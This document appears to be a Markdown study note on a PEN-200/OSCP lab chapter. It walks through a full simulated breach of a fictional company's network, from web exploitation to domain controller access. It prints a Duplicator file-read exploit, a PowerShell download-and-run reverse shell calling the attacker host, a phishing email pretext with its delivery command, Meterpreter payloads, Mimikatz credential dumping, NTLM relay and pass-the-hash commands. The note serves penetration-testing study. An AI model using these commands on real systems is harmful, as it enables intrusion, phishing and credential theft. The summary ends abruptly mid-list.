---
title: "PEN-200 Chapter 24 - Assembling the Pieces"
aliases:
  - "PEN200 Ch24"
  - "Assembling the Pieces"
tags:
  - oscp
  - pen-200
  - enumeration
  - privilege-escalation
  - pivoting
  - active-directory
  - kerberoasting
  - ntlm-relay
  - lateral-movement
source: "PEN-200 Chapter 24 - Assembling the Pieces"
---

# PEN-200 Chapter 24 — Assembling the Pieces

> [!summary]
> This chapter is the PEN-200 “Challenge Lab Zero”: a complete attack path that combines public-facing enumeration, web exploitation, Linux privilege escalation, credential reuse, phishing, internal-network pivoting, Active Directory enumeration, Kerberoasting, NTLM relay, credential dumping, and lateral movement to the domain controller.

## Chapter goal and scenario

BEYOND Finances provides two public targets: **MAILSRV1** and **WEBSRV1**. The assessment objective is to breach the perimeter, gain access to the internal network, obtain **Domain Administrator** privileges, and access the **domain controller**.

The chapter repeatedly reinforces four habits:

- **Enumerate thoroughly even after finding an apparent exploit.** A quick win can hide a better route.
- **Document everything.** Findings that are useless now may become decisive later.
- **Re-enumerate after privilege changes.** Root/SYSTEM can see data that a low-privilege user cannot.
- **Combine information across hosts and phases.** The final path exists because unrelated-looking findings are chained together.

---

# 24.1 Enumerating the Public Network

## 24.1.1 MAILSRV1

### Purpose

Create a clean workspace and enumerate the first externally reachable host. The chapter recommends a fresh Kali image for each assessment to avoid mixing or exposing data from prior clients.

### Workspace setup

```bash
mkdir beyond
cd beyond
mkdir mailsrv1
mkdir websrv1
touch creds.txt
```

**What/why**

- `mkdir beyond` — creates a root folder for the assessment.
- `cd beyond` — enters that workspace.
- `mkdir mailsrv1`, `mkdir websrv1` — separates evidence and output by target.
- `touch creds.txt` — creates a running credential/user notebook.

> [!tip]
> The chapter explicitly recommends structured note-taking and mentions **Obsidian** as a practical Markdown-based option.

### Nmap scan of MAILSRV1

```bash
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
```

**Arguments**

- `sudo` — runs Nmap with elevated privileges where required.
- `-sC` — runs Nmap default NSE scripts.
- `-sV` — performs service/version detection.
- `-oN mailsrv1/nmap` — saves normal-format output for later review.
- `192.168.50.242` — MAILSRV1.

**Key result**

MAILSRV1 is Windows and exposes eight ports, including:

- `25/tcp` SMTP — hMailServer
- `80/tcp` HTTP — Microsoft IIS 10.0
- `110/tcp` POP3 — hMailServer
- `135/tcp` MSRPC
- `139/tcp` NetBIOS
- `143/tcp` IMAP — hMailServer
- `445/tcp` SMB
- `587/tcp` SMTP — hMailServer

SMB signing is reported as **enabled but not required**, which later matters when thinking about relay opportunities.

The chapter researches hMailServer/CVEs but does not find an actionable version-matched exploit. The lesson is not to stop enumeration just because one avenue looks unpromising—or because another avenue looks promising.

### Web content enumeration with Gobuster

```bash
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```

**Arguments**

- `dir` — directory/file enumeration mode.
- `-u http://192.168.50.242` — target URL.
- `-w /usr/share/wordlists/dirb/common.txt` — wordlist.
- `-o mailsrv1/gobuster` — saves output.
- `-x txt,pdf,config` — also tests those file extensions.

**Result**: no useful files/directories are found. The IIS site is only the default welcome page.

> [!important]
> A technique returning **nothing** is still useful: it removes hypotheses and helps build a complete picture.

### Where MAILSRV1 fits later

At this point the mail service is not directly exploitable. The chapter keeps it in mind because **valid credentials found later can turn SMTP into a phishing delivery mechanism**. This is a concrete example of the cyclical nature of penetration testing.

---

## 24.1.2 WEBSRV1

### Nmap scan

```bash
sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
```

**Result**

- `22/tcp` — OpenSSH 8.9p1 Ubuntu 3
- `80/tcp` — Apache 2.4.52 on Ubuntu
- Nmap detects **WordPress 6.0.2**.

The OpenSSH banner maps to **Ubuntu 22.04 (Jammy Jellyfish)**. SSH is not attacked yet because there are no credentials.

### Manual source inspection

The page source contains `wp-content` and `wp-includes`, strong indicators of WordPress. This shows why browser/source inspection is worth doing even when the visible site looks simple.

### WhatWeb

```bash
whatweb http://192.168.50.244
```

**What/why**: fingerprints web technologies. It confirms Apache/Ubuntu and WordPress 6.0.2.

### WPScan plugin enumeration

```bash
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
cat websrv1/wpscan
```

**Arguments**

- `--url` — target WordPress URL.
- `--enumerate p` — enumerate popular plugins.
- `--plugins-detection aggressive` — actively checks known plugin locations.
- `-o websrv1/wpscan` — writes scan output.
- `cat` — reviews saved output.

**Plugins found**

- akismet
- classic-editor
- contact-form-7
- **duplicator 1.3.26** — outdated
- elementor
- wordpress-seo

WPScan can query its vulnerability database with an API token, but the chapter demonstrates that it remains useful for component discovery without one.

### SearchSploit

```bash
searchsploit duplicator
```

**What/why**: searches the local Exploit-DB index for public exploits matching the discovered component.

Important match:

```text
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read | php/webapps/50420.py
```

A Metasploit version is also listed. The standalone Python exploit becomes the next path.

### Enumeration conclusion

WEBSRV1 is the stronger public target because a **version-matched Duplicator 1.3.26 arbitrary file-read vulnerability** is available.

---

# 24.2 Attacking a Public Machine

## 24.2.1 Initial Foothold

### Inspect the exploit

```bash
searchsploit -x 50420
```

- `-x 50420` — opens/displays the exploit entry and code for Exploit-DB ID `50420`.

The exploit targets **CVE-2020-11738** and performs an unauthenticated arbitrary file read using directory traversal.

### Exploit code shown in the chapter

```python
import requests as re
import sys

if len(sys.argv) != 3:
    print("Exploit made by nam3lum.")
    print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
    exit()

arg = sys.argv[1]
file = sys.argv[2]
URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
output = re.get(url=URL)
print(output.text)
```

**How it works**

- `sys.argv[1]` — base target URL.
- `sys.argv[2]` — file to retrieve.
- The request targets WordPress `admin-ajax.php` and the vulnerable Duplicator `duplicator_download` action.
- Multiple `../` sequences traverse out of the expected directory.
- `requests.get()` retrieves the requested file and prints the response body.

### Copy the exploit locally

```bash
cd beyond/websrv1
searchsploit -m 50420
```

- `-m 50420` — mirrors/copies the Exploit-DB exploit into the current directory.

### Confirm the vulnerability and enumerate users

```bash
python3 50420.py http://192.168.50.244 /etc/passwd
```

**Why**: `/etc/passwd` is a safe, high-value first proof of Linux file read and exposes local account names.

Accounts identified include:

```text
daniela
marcus
```

### Try to retrieve SSH private keys

```bash
python3 50420.py http://192.168.50.244 /home/marcus/.ssh/id_rsa
python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
```

Marcus’s key is not retrieved, but Daniela’s `id_rsa` is successfully read. Save it locally as `id_rsa`.

> [!note]
> The chapter reminds us that private-key filenames depend on key type; `id_rsa` is only one common default.

### Prepare and test the key

```bash
chmod 600 id_rsa
ssh -i id_rsa daniela@192.168.50.244
```

**Arguments**

- `chmod 600 id_rsa` — owner read/write only; SSH rejects overly permissive private keys.
- `ssh -i id_rsa` — explicitly selects the stolen private key.

The key is passphrase-protected.

### Crack the SSH key passphrase

```bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

**Tools/arguments**

- `ssh2john id_rsa` — converts the encrypted SSH private key into a John-the-Ripper-compatible hash.
- `> ssh.hash` — redirects the converted hash to a file.
- `john --wordlist=... ssh.hash` — performs a dictionary attack using `rockyou.txt`.

Recovered passphrase:

```text
tequieromucho
```

### SSH foothold

```bash
ssh -i id_rsa daniela@192.168.50.244
```

Enter the recovered passphrase. The result is an interactive shell as `daniela` on WEBSRV1.

**Credential discipline**: add `daniela:tequieromucho` to `creds.txt` because passwords/passphrases are frequently reused.

---

## 24.2.2 A Link to the Past

### Transfer and run linPEAS

On Kali:

```bash
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80
```

- `cp` — copies linPEAS into the directory being served.
- `python3 -m http.server 80` — starts a simple HTTP server on TCP/80.

On WEBSRV1:

```bash
wget http://192.168.119.5/linpeas.sh
chmod a+x ./linpeas.sh
./linpeas.sh
```

- `wget` — downloads the enumeration script.
- `chmod a+x` — makes it executable for all users.
- `./linpeas.sh` — runs automated Linux post-exploitation enumeration.

### Important linPEAS findings

#### Operating system

Ubuntu 22.04.1 LTS, kernel `5.15.0-48-generic`.

#### Network interfaces

Only the public `192.168.50.244/24` interface is present (besides loopback), so WEBSRV1 is **not** a direct pivot into the internal network.

#### Sudo permission

```text
(ALL) NOPASSWD: /usr/bin/git
```

Daniela may run Git as root without a password.

#### WordPress database credentials

From `/srv/www/wordpress/wp-config.php`:

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```

Store the cleartext password because it may be reused elsewhere.

#### Git repository

```text
/srv/www/wordpress/.git
```

The repository is root-owned and not readable by Daniela, but the sudo permission on Git gives a path to privileged Git operations.

### Candidate privilege-escalation paths

1. Abuse `sudo /usr/bin/git`.
2. Use privileged Git access to inspect the repository.
3. Try the WordPress DB password against other users/services.

The chapter prioritizes the direct sudo abuse.

### GTFOBins sudo-Git attempt 1

```bash
sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
```

- `PAGER=...` — attempts to set Git’s pager to a shell-spawning command.
- `-p` — paginate output.
- `help` — triggers help display.

This fails because the sudo policy forbids setting `PAGER`.

### GTFOBins sudo-Git attempt 2

```bash
sudo git -p help config
```

This opens Git help through the privileged pager (commonly `less`). Inside the pager, execute:

```text
!/bin/bash
```

Then verify:

```bash
whoami
```

Result:

```text
root
```

**Why it works**: `less` supports `!command`; because the pager was launched by root-owned `sudo git`, the command executes with root privileges.

### Inspect Git history without altering the working tree

```bash
cd /srv/www/wordpress/
git status
git log
```

- `git status` — confirms repository state.
- `git log` — displays commit history.

The interesting commit is:

```text
Removed staging script and internal network access
```

Instead of `git checkout` (which could change/break production state), use:

```bash
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
```

- `git show <commit>` — displays commit metadata and diff without switching the working tree.

The deleted script contains:

```bash
#!/bin/bash

# Script to obtain the current state of the web app from the staging server

sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```

**Important artifact**

- Username: `john`
- Password: `dqsTwTpZPn#nL`
- `sshpass -p` — supplies an SSH password non-interactively.
- `rsync john@...:/current_webapp/ ...` — copies staging content over SSH.

Add the new credentials to `creds.txt`.

> [!tip]
> After reaching root, the chapter recommends running linPEAS again in a real assessment because privileged execution can reveal previously unreadable data.

---

# 24.3 Gaining Access to the Internal Network

## 24.3.1 Domain Credentials

### Current credential set

```text
daniela:tequieromucho            (SSH private-key passphrase)
wordpress:DanielKeyboard3311     (WordPress DB credential)
john:dqsTwTpZPn#nL               (deleted fetch_current.sh)
Other identified user: marcus
```

Build username/password lists:

```text
# usernames.txt
marcus
john
daniela
```

```text
# passwords.txt
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```

The `wordpress` DB username is omitted because it is not treated as a real OS/domain user.

### Credential spraying/checking with CrackMapExec

```bash
crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
```

**Arguments**

- `smb` — use the SMB protocol module.
- `192.168.50.242` — MAILSRV1.
- `-u usernames.txt` — username list.
- `-p passwords.txt` — password list.
- `--continue-on-success` — continue testing after a valid pair is found.

Valid credentials:

```text
beyond.com\john:dqsTwTpZPn#nL
```

CrackMapExec also identifies the AD domain as `beyond.com`, confirming MAILSRV1 is domain joined.

> [!warning]
> `STATUS_LOGON_FAILURE` does **not** prove that a username exists; it can be returned for both nonexistent users and incorrect passwords.

### Enumerate SMB shares with valid credentials

```bash
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
```

- `--shares` — lists available SMB shares and permissions.

Only default/non-actionable shares are available. John is not shown as local administrator (`Pwn3d!` is absent).

The remaining useful path is phishing via MAILSRV1.

---

## 24.3.2 Phishing for Access

The chapter chooses a **Windows Library + shortcut** client-side attack instead of Office macros because the internal endpoint software is unknown.

The setup requires:

- WebDAV server
- Python HTTP server
- Netcat listener
- `.Library-ms` file
- Windows shortcut (`.lnk`) that downloads PowerCat and launches a reverse shell
- SMTP delivery with authenticated `swaks`

### Start WsgiDAV

```bash
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

**Arguments**

- `--host=0.0.0.0` — listen on all interfaces.
- `--port=80` — TCP/80.
- `--auth=anonymous` — no credentials required.
- `--root .../webdav/` — WebDAV root directory.

### Windows Library file

On the Windows prep VM, create `config.Library-ms` with:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://192.168.119.5</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

The important element is the WebDAV location:

```xml
<url>http://192.168.119.5</url>
```

### Shortcut PowerShell payload

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

**What it does**

- `powershell.exe -c` — executes the supplied PowerShell command.
- `New-Object System.Net.WebClient` — creates a web client.
- `.DownloadString(...)` — downloads PowerCat source.
- `IEX(...)` — executes the downloaded script in memory.
- `powercat -c 192.168.119.5` — connect back to Kali.
- `-p 4444` — destination port.
- `-e powershell` — attach an interactive PowerShell process.

### Serve PowerCat

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
```

### Start reverse-shell listener

```bash
nc -nvlp 4444
```

- `-n` — no DNS resolution.
- `-v` — verbose.
- `-l` — listen.
- `-p 4444` — local port 4444.

### Phishing pretext used in the chapter

```text
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists
in the Git logs. I'll remove it for security reasons.
On an unrelated note, please install the new security features on your workstation.
For this, download the attached file, double-click on it, and execute the
configuration shortcut within. Thanks!
John
```

The point is to use organization-specific information recovered during enumeration to make the message more credible.

### Send the email with `swaks`

```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

Then authenticate as:

```text
Username: john
Password: dqsTwTpZPn#nL
```

**Arguments**

- `-t ...` — recipients; repeated for multiple targets.
- `--from john@beyond.com` — SMTP envelope sender.
- `--attach @config.Library-ms` — attach the Library file.
- `--server 192.168.50.242` — use MAILSRV1 SMTP.
- `--body @body.txt` — load body text from file.
- `--header "Subject: Staging Script"` — subject header.
- `--suppress-data` — reduce displayed SMTP DATA details.
- `-ap` — enable password authentication and prompt for credentials.

### Confirm the foothold

On the incoming shell:

```powershell
whoami
hostname
ipconfig
```

Result:

```text
User: beyond\marcus
Host: CLIENTWK1
IP: 172.16.6.243/24
Gateway: 172.16.6.254
```

This is the first confirmed **internal-network foothold**.

---

# 24.4 Enumerating the Internal Network

## 24.4.1 Situational Awareness

The chapter first enumerates the compromised endpoint, then Active Directory.

### Download and run winPEAS

```powershell
cd C:\Users\marcus
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

**Arguments**

- `iwr` — PowerShell alias for `Invoke-WebRequest`.
- `-uri` — download source.
- `-Outfile winPEAS.exe` — save destination.
- `.\winPEAS.exe` — execute from current directory.

winPEAS reports Windows 10 Pro, but the chapter deliberately validates this manually.

### Verify the OS

```powershell
systeminfo
```

Correct result: **Windows 11 Pro**, build 22000.

> [!important]
> Automated enumeration output can be wrong. Validate important facts with native/manual commands.

### Network/DNS findings

winPEAS shows:

- CLIENTWK1: `172.16.6.243/24`
- Gateway: `172.16.6.254`
- DNS: `172.16.6.240`
- Cached `dcsrv1.beyond.com` → `172.16.6.240`
- Cached `mailsrv1.beyond.com` → `172.16.6.254`

This reveals that MAILSRV1 is **dual-homed**: externally `192.168.50.242`, internally `172.16.6.254`.

The chapter creates `computer.txt` to track discovered hosts:

```text
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User marcus fetches emails on this machine
```

No useful local privilege-escalation vector is found on CLIENTWK1, and the chapter stresses that you do **not** need Administrator on every machine in a real engagement.

### Prepare SharpHound

On Kali:

```bash
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

On CLIENTWK1:

```powershell
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
```

**Arguments/PowerShell syntax**

- `powershell -ep bypass` — starts PowerShell with ExecutionPolicy bypassed for this process.
- `. .\SharpHound.ps1` — dot-sources/imports the script into the current PowerShell session.

### Collect BloodHound data

```powershell
Invoke-BloodHound -CollectionMethod All
```

- `-CollectionMethod All` — asks SharpHound to run all available collection methods (groups, sessions, local admin, ACLs, trusts, etc.).

Then locate the generated archive:

```powershell
dir
```

Import the ZIP into BloodHound after starting Neo4j/BloodHound.

### Cypher: list all computers

```cypher
MATCH (m:Computer) RETURN m
```

- `MATCH` — selects graph objects matching the pattern.
- `(m:Computer)` — variable `m` bound to Computer nodes.
- `RETURN m` — returns/displays those nodes.

Computers discovered:

```text
DCSRV1.BEYOND.COM       Windows Server 2022 Standard
INTERNALSRV1.BEYOND.COM Windows Server 2022 Standard
MAILSRV1.BEYOND.COM     Windows Server 2022 Standard
CLIENTWK1.BEYOND.COM    Windows 11 Pro
```

### Resolve INTERNALSRV1

```powershell
nslookup INTERNALSRV1.BEYOND.COM
```

Result:

```text
172.16.6.241
```

Add it to `computer.txt`.

### Enumerate domain users

Using the same Cypher idea but `User` instead of `Computer`, BloodHound reveals:

```text
BECCY
JOHN
DANIELA
MARCUS
```

Mark known-compromised principals **MARCUS** and **JOHN** as **Owned** in BloodHound.

### Find Domain Admins

Use BloodHound’s pre-built **Find all Domain Admins** query.

Result: **beccy** is a member of **Domain Admins** and becomes the high-value target.

The chapter notes that groups and GPOs should normally also be enumerated, but they are skipped here because they do not provide value in this simulated environment.

### BloodHound queries that return no attack path

Run:

- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals

No useful path is returned. This rules out several easy lateral-movement routes.

---

## 24.4.2 Services and Sessions

### Cypher: active sessions

```cypher
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

**Meaning**

- `(c:Computer)` — computer node.
- `[:HasSession]` — session relationship.
- `(m:User)` — user node.
- `p = ...` — stores the full path in `p`.
- `RETURN p` — displays the relationships graphically.

Important sessions:

- `marcus` on CLIENTWK1.
- **beccy (Domain Admin)** on MAILSRV1.
- Local Administrator (RID 500) on INTERNALSRV1.

The beccy session suggests that if MAILSRV1 can be compromised as SYSTEM/admin, beccy’s cached credentials may be extractable.

### Find Kerberoastable accounts

Use BloodHound’s **List all Kerberoastable Accounts** query.

Result: `daniela` has SPN:

```text
http/internalsrv1.beyond.com
```

This links Daniela directly to the internal web server and makes Kerberoasting a promising credential path.

### Create a Meterpreter payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
```

**Arguments**

- `-p windows/x64/meterpreter/reverse_tcp` — 64-bit Windows staged Meterpreter reverse TCP payload.
- `LHOST=192.168.119.5` — Kali callback IP.
- `LPORT=443` — callback port.
- `-f exe` — output format Windows executable.
- `-o met.exe` — output filename.

### Start Metasploit handler

```text
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.119.5
set LPORT 443
set ExitOnSession false
run -j
```

**Arguments/options**

- `-q` — quiet Metasploit startup.
- `multi/handler` — receives callbacks for a selected payload.
- `ExitOnSession false` — keep listener active after sessions arrive.
- `run -j` — run handler as a background job.

> [!note]
> The chapter’s displayed handler output contains an inconsistency: the command sets `reverse_tcp`, while one output line reports an HTTPS handler/payload. For exam notes, preserve the **commands actually entered** and ensure your payload/handler match in your own lab.

### Download and execute Meterpreter on CLIENTWK1

```powershell
iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
.\met.exe
```

A Meterpreter session opens.

### Add an internal route with Metasploit

```text
use multi/manage/autoroute
set session 1
run
```

This adds the discovered route:

```text
172.16.6.0/255.255.255.0
```

### Start SOCKS5 proxy

```text
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

- `SRVHOST 127.0.0.1` — bind the proxy locally on Kali.
- `VERSION 5` — SOCKS5.
- `run -j` — background job.

Check Proxychains config:

```bash
cat /etc/proxychains4.conf
```

Required active line:

```text
socks5 127.0.0.1 1080
```

### Enumerate SMB through the pivot

```bash
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```

**Arguments**

- `proxychains -q` — route the tool through the configured SOCKS proxy; quiet wrapper output.
- `smb` — CME SMB module.
- `172.16.6.240-241 172.16.6.254` — DCSRV1, INTERNALSRV1, MAILSRV1.
- `-u john` — username.
- `-d beyond.com` — AD domain.
- `-p ...` — password.
- `--shares` — enumerate shares/permissions.

Important finding: **SMB signing is false on INTERNALSRV1 and MAILSRV1**, making SMB relay conceptually possible if authentication can be forced.

### Nmap through Proxychains

```bash
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
```

**Arguments**

- `-sT` — TCP connect scan; required because SYN scans do not work through Proxychains in this setup.
- `-oN nmap_servers` — save normal-format scan output.
- `-Pn` — skip host discovery and treat hosts as up.
- `-p 21,80,443` — focus on FTP/HTTP/HTTPS.

Results:

- DCSRV1: 21/80/443 closed.
- INTERNALSRV1: **80 and 443 open**.
- MAILSRV1: 80 open.

### Chisel for a stable browser tunnel

On Kali:

```bash
chmod a+x chisel
./chisel server -p 8080 --reverse
```

- `server` — server mode.
- `-p 8080` — listen on TCP/8080.
- `--reverse` — allow reverse port forwarding initiated by the client.

Upload the Windows client via Meterpreter:

```text
sessions -i 1
upload chisel.exe C:\Users\marcus\chisel.exe
```

Then from CLIENTWK1 shell:

```cmd
chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
```

**Reverse-forward syntax**

```text
R:<Kali-local-port>:<internal-target>:<internal-target-port>
```

Here, Kali port 80 forwards through CLIENTWK1 to INTERNALSRV1 port 80.

### Fix WordPress DNS redirect locally

The WordPress application redirects to `internalsrv1.beyond.com`, so add:

```text
127.0.0.1 internalsrv1.beyond.com
```

to `/etc/hosts`.

Then browse the tunneled WordPress site and `/wordpress/wp-admin`. Existing credentials do not yet work.

### Internal-enumeration conclusion

The key chain of facts is now:

- Beccy (Domain Admin) has a session on MAILSRV1.
- Local Administrator has a session on INTERNALSRV1.
- Daniela is Kerberoastable and tied to INTERNALSRV1 by SPN.
- INTERNALSRV1 runs WordPress.
- MAILSRV1 and INTERNALSRV1 have SMB signing disabled.

These facts are individually incomplete, but together they create the next attack path.

---

# 24.5 Attacking an Internal Web Application

## 24.5.1 Speak Kerberoast and Enter

### Kerberoast Daniela through the pivot

```bash
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
```

Enter John’s password when prompted.

**Arguments**

- `proxychains -q` — route to the internal DC through SOCKS.
- `impacket-GetUserSPNs` — enumerates SPN-bearing accounts and can request service tickets.
- `-request` — request TGS tickets and output crackable TGS-REP hashes.
- `-dc-ip 172.16.6.240` — explicitly identify DCSRV1.
- `beyond.com/john` — authenticated domain user used to request the ticket.

The output returns a `$krb5tgs$23$...` hash for `daniela` and confirms SPN:

```text
http/internalsrv1.beyond.com
```

### Crack the TGS-REP hash

Save it as `daniela.hash`, then:

```bash
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
```

**Arguments**

- `-m 13100` — Hashcat mode for Kerberos 5 TGS-REP etype 23.
- `daniela.hash` — captured service-ticket hash.
- `rockyou.txt` — dictionary.
- `--force` — force execution despite Hashcat warnings; the chapter uses it here.

Recovered password:

```text
DANIelaRO123
```

Add the username/password to `creds.txt`.

### Log in to WordPress

Use Daniela’s cracked password at INTERNALSRV1’s WordPress `/wp-admin` page. Login succeeds.

> [!note]
> The chapter reminds us that even without local-admin rights or RDP access, a valid domain credential may still work with other protocols/services such as WinRM.

---

## 24.5.2 Abuse a WordPress Plugin for a Relay Attack

### WordPress findings

- Daniela is the only WordPress user.
- The enabled plugin is **Backup Migration**.
- Its configuration exposes a **Backup directory path** field.

The chapter considers two possibilities:

1. Upload a malicious WordPress plugin/web shell for code execution on INTERNALSRV1.
2. Abuse the backup path to force SMB authentication, relay it to MAILSRV1, and obtain SYSTEM there.

The second route is prioritized because it directly supports the assessment goal.

### Reasoning behind the relay chain

Previously gathered facts are combined:

- A local Administrator session exists on INTERNALSRV1.
- The WordPress service is assumed to run in that privileged context.
- Local Administrator passwords are assumed to be reused between INTERNALSRV1 and MAILSRV1.
- SMB signing is disabled on both hosts.
- Beccy (Domain Admin) has a session on MAILSRV1.
- The plugin allows a path that can point to an attacker-controlled UNC/URI location.

If INTERNALSRV1 authenticates outward as its local Administrator and that credential is valid on MAILSRV1, NTLM relay can execute a command on MAILSRV1.

### Start `ntlmrelayx`

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
```

**Arguments**

- `--no-http-server` — do not start ntlmrelayx’s HTTP server.
- `-smb2support` — enable SMB2 support.
- `-t 192.168.50.242` — relay target is MAILSRV1’s externally reachable address.
- `-c "..."` — command executed after successful relay.
- `powershell -enc ...` — Base64-encoded PowerShell reverse-shell one-liner. The chapter abbreviates the encoded blob as `JABjAGwAaQ...` rather than printing the entire payload.

Using MAILSRV1’s external address avoids routing the relay itself through Proxychains.

### Start listener

```bash
nc -nvlp 9999
```

### Force authentication from the WordPress plugin

Set the Backup Migration destination path to:

```text
//192.168.119.5/test
```

Saving the setting causes the underlying process to authenticate to Kali.

`ntlmrelayx` reports:

```text
Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
Executed specified command on host: 192.168.50.242
```

The Netcat shell confirms:

```powershell
whoami
# nt authority\system

hostname
# MAILSRV1
```

This verifies both assumptions: the request came from `INTERNALSRV1\Administrator`, and the local Administrator password was accepted on MAILSRV1.

---

# 24.6 Gaining Access to the Domain Controller

## 24.6.1 Cached Credentials

The chapter now has SYSTEM on MAILSRV1, where BloodHound showed a **beccy** session.

> [!warning]
> **Source inconsistency:** the opening prose of this subsection says the next step is to extract the password hash for **daniela**, but the prior BloodHound result and the actual Mimikatz output target **beccy**, the Domain Admin. The demonstrated attack clearly extracts **beccy’s** credentials.

The chapter also warns not to skip local enumeration merely because a credential-dumping path is available.

### Upgrade to Meterpreter

```powershell
cd C:\Users\Administrator
iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
.\met.exe
```

A second Meterpreter session arrives.

### Interact and spawn PowerShell

```text
sessions -i 2
shell
```

Then:

```cmd
powershell
```

### Download and launch Mimikatz

```powershell
iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```

### Obtain debug privilege and dump logon credentials

```text
privilege::debug
sekurlsa::logonpasswords
```

**Mimikatz commands**

- `privilege::debug` — requests/enables `SeDebugPrivilege`, necessary for accessing sensitive process memory.
- `sekurlsa::logonpasswords` — enumerates credentials from authentication-provider data in LSASS memory.

Recovered for `BEYOND\beccy`:

```text
NTLM: f0397ec5af49971f6efbdb07877046b3
Password: NiftyTopekaDevolve6655!#!
```

Store both in `creds.txt`.

---

## 24.6.2 Lateral Movement

With Domain Admin credentials, move to DCSRV1 using pass-the-hash.

### PsExec with NTLM hash

```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
```

**Arguments**

- `proxychains -q` — reach DCSRV1 through the existing SOCKS pivot.
- `impacket-psexec` — obtains command execution through SMB/service creation when the account has sufficient rights.
- `-hashes LMHASH:NTHASH` — pass-the-hash authentication.
- `00000000000000000000000000000000` — placeholder/empty LM hash value.
- `f039...46b3` — Beccy’s NTLM hash.
- `beccy@172.16.6.240` — Domain Admin account and DCSRV1 IP.

Verify:

```cmd
whoami
hostname
ipconfig
```

Result:

```text
nt authority\system
DCSRV1
172.16.6.240
```

The assessment goals are achieved: **Domain Administrator privileges** and **access to the domain controller**.

---

# 24.7 Wrapping Up

The chapter’s end-to-end path is:

```text
Public enumeration
  ↓
WEBSRV1 WordPress/Duplicator file read
  ↓
Daniela SSH key → crack passphrase → SSH
  ↓
Linux enum → sudo Git abuse → root
  ↓
Git history → John domain credential
  ↓
Validate credential on MAILSRV1
  ↓
Authenticated phishing through SMTP
  ↓
Marcus shell on CLIENTWK1 (internal network)
  ↓
winPEAS + SharpHound/BloodHound + pivoting
  ↓
Daniela SPN → Kerberoasting → WordPress login
  ↓
Backup Migration path → forced SMB authentication
